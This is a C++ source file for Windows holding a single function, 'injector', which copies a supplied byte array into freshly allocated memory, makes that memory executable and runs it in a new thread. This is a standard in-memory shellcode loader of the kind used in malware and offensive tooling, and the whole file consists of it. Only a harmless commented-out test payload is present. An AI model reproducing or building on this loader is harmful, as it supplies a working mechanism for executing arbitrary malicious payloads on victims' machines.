#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <vector>
#include <iostream>
int injector(std::vector<uint8_t> payloadVector) {
	void* exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	//this bugs out too

	//unsigned char payload[] = {
	//	0x90,	//nop
	//	0x90,	//nop
	//	0xcc,	//int3
	//	0xc3	//ret
	//};
	unsigned char* payload = payloadVector.data();

	unsigned int payload_len = payloadVector.size();

	//create buffer for payload

	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	//copy to buffer
	RtlMoveMemory(exec_mem, payload, payload_len);

	//make executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	//printf("\nRun\n");

	if (rv != 0) {
		std::cout << "Starting payload thread" << std::endl;
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}

	return 0;
}